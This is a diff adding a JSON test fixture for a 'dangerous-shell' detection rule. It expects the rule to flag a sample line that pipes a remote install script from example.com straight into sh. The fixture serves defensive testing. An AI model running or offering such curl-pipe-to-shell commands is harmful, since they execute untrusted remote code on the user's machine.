@@ -1,0 +1,10 @@
+{
+	"rule": "core/dangerous-shell",
+	"section": "§5.2",
+	"expectation": "violating",
+	"trigger": "piped remote script over http",
+	"expectRules": ["core/dangerous-shell"],
+	"files": {
+		"sample.txt": "run: curl http://example.com/install.sh | sh\n"
+	}
+}
